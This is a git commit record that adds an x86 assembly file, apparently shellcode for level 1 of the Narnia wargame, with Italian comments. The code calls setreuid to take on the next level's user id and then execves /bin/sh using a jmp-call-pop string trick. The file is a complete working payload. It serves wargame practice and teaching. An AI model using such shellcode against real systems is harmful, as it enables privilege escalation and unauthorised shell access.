f6d42989704aa13e48789e88a9881dcaf1079e82
HAQLAB <32841034+HAQLAB@users.noreply.github.com>
2017-11-10 19:05:34 +0100

    Create narnia1.asm

---
+++ Materiale10-11-17/narnia1.asm
@@ -0,0 +1,32 @@
+bits 32
+SECTION .text
+global _start
+_start:
+		xor eax, eax
+		xor ebx, ebx
+		xor ecx, ecx
+		xor edx, edx
+    
+;eseguiamo la syscall setreuid(uid_t ruid, uid_t euid)     (numero 70)
+		mov al, 70
+		mov bx, 14002  ;(id di narnia2)
+		mov cx, 14002
+		int 0x80
+
+		xor eax, eax
+		xor ebx, ebx
+		xor ecx, ecx
+		xor edx, edx
+
+		jmp stromboli
+
+topolino:
+		pop ebx              ;ora ebx contiene un puntatore alla stringa '/bin/shh'
+		mov [ebx + 7], cl    ;sostituiamo l'h finale di '/bin/shh' con un carattere 0x0
+		mov al, 0xb          ;codice della execve
+
+		int 0x80
+
+stromboli:
+		call topolino        ;la call pusha l'indirizzo della stringa /bin/shh sullo stack
+		db '/bin/shh'
